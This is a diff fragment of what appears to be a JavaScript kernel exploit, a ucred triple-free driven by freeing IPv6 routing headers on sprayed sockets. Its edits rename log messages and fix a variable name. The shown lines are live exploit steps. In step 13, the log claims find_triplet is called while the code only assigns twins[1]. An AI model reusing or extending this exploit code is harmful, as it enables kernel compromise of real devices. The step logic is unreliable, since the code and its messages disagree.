@@ -1353,14 +1353,14 @@ function trigger_ucred_triplefree() {
     }
 
     // STEP 9 — تحرير التوين الثاني
-    send_notification("[STEP 9] Freeing twin index=" + twins[1]);
+    send_notification("[STEP 9] Freeing twins index=" + twins[1]);
     free_rthdr(ipv6_socks[twins[1]]);
 
 
-    send_notification("[STEP 10] Proceeding with triplets using twin=" + twins[0]);
+    send_notification("[STEP 10] Proceeding with triplets using twins=" + twins[0]);
 
     // STEP 11 — تجهيز master triplet
-    send_notification("[STEP 11] Setting master triplet from twin=" + twins[0]);
+    send_notification("[STEP 11] Setting master triplet from twins=" + twins[0]);
     triplets[0] = twins[0];
     send_notification("[STEP 11] triplets[0] = " + triplets[0]);
 
@@ -1379,7 +1379,7 @@ function trigger_ucred_triplefree() {
 
     // STEP 13 — إيجاد التريبلت الثاني
     send_notification("[STEP 13] Calling find_triplet(master=" + triplets[0] + ", skip=" + triplets[1] + ")");
-    triplets[2] = twin[1];
+    triplets[2] = twins[1];
     send_notification("[STEP 13] find_triplet returned triplet2=" + triplets[2]);
 
     if (triplets[2] === -1) {
